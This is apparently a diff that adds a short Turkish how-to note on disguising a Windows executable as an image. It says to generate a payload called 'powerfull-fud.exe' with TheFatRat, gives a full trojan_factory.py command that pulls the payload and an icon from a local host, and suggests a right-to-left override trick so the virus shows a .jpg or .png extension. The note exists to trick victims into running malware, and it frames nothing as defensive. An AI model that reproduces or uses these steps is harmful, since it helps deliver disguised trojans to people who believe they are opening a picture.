@@ -1,0 +1,10 @@
+Trojan Factory ile bir exe dosyasını ico gibi göstermek:
+
+ilk önce TheFatratFactory programu ile bir tane powerfull-fud.exe adıyla payload oluşturuyoruz. Terminale fatrat yaz ve enter bas. Gerisi gelir.
+
+python3 trojan_factory.py -f http://192.168.1.102/open/profil.jpeg -e http://192.168.1.102/open/powerfull-fud.exe -o /home/celik/Desktop/resim -i http://192.168.1.102/open/profil.ico
+
+
+kodu terminale yazıyoruz ve karşılığında bize ico görünümle exe dosyasını verecektir.
+
+NOT: exe uzantılı virüsümüzün uzantısını .jpg veya .png gibi gösterme hilesi için internetten right-left overrite aratabilirsin.
